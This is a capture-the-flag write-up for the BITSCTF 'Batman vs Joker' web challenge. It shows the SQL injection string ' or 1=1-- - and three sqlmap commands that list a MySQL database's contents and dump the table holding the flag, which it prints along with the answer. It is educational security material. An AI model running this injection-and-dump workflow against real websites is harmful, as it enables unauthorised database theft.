# Web 30: Batman vs Joker

**Description:**

Joker has left a message for you. Your job is to get to the message asap.

`joking.bitsctf.bits-quark.org`

# Writeup

Opening the website, we can fill in a field. Fiddling around with the values I noticed they were numerical:

![1](files/1.png?raw=true)

Next sqli 101 `' or 1=1-- -`:

![2](files/2.png?raw=true)

Unfortunately it didn't give us the flag. I decided to use sqlmap. First I had to enumerate the dbs:

```
sqlmap --url 'http://joking.bitsctf.bits-quark.org/index.php' --method post --data 'submit1=submit&id=1' -p id --dbms mysql -dbs
```

Then I had to enumerate the tables from the `hack` db:

```
sqlmap --url 'http://joking.bitsctf.bits-quark.org/index.php' --method post --data 'submit1=submit&id=1' -p id --dbms mysql -D hack --tables
```

Finally I could dump the table I needed:

```
sqlmap --url 'http://joking.bitsctf.bits-quark.org/index.php' --method post --data 'submit1=submit&id=1' -p id --dbms mysql -D hack -T Joker --dump

*** output omitted ***

Database: hack
Table: Joker
[1 entry]
+----------------------------------------------------------+-----------------------------+
| Flag                                                     | HaHaHa                      |
+----------------------------------------------------------+-----------------------------+
| BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!} | Enjoying the game Batman!!! |
+----------------------------------------------------------+-----------------------------+
```

We got the flag!